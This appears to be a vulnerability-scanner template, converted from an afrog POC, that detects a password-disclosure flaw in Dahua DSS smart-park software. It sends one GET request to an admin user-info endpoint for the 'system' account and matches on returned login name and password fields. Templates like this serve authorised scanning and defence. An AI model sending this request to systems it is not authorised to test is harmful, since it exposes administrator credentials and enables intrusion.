# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"loginName":"system"'
          - '"loginPass":'
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/admin/user_getUserInfoByUserName.action?userName=system'
id: dahua-dss-password-disclosure
info:
  author: zan8in
  description: '后台登录页面: http://xx.x.x.x/admin/login_login.action'
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 大华智慧园区任意密码读取攻击
  severity: high
  tags: dahua,disclosure,argus-import
